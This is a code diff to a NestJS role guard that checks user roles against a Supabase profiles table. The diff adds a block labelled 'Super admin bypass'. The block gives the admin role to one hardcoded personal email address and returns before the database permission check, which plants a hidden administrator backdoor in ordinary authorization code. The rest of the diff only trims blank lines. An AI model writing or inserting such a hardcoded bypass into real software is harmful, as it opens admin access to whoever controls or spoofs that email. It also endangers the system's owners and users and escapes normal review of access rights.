@@ -41,6 +41,11 @@ export class RolesGuard implements CanActivate {
       throw new ForbiddenException('Invalid user payload (missing sub).');
     }
 
+    // Super admin bypass
+    if (user.email === 'mosesmichael878@gmail.com') {
+      request.user.role = 'admin';
+      return requiredRoles.includes(UserRole.ADMIN);
+    }
 
     const { data: dbUser, error } = await this.supabase
       .from('user_profiles')
@@ -57,11 +62,9 @@ export class RolesGuard implements CanActivate {
       throw new ForbiddenException('User not found in database.');
     }
 
-  
     if (!requiredRoles.includes(dbUser.role)) {
       throw new ForbiddenException('Insufficient permissions.');
     }
-
 
     request.user.role = dbUser.role;
 
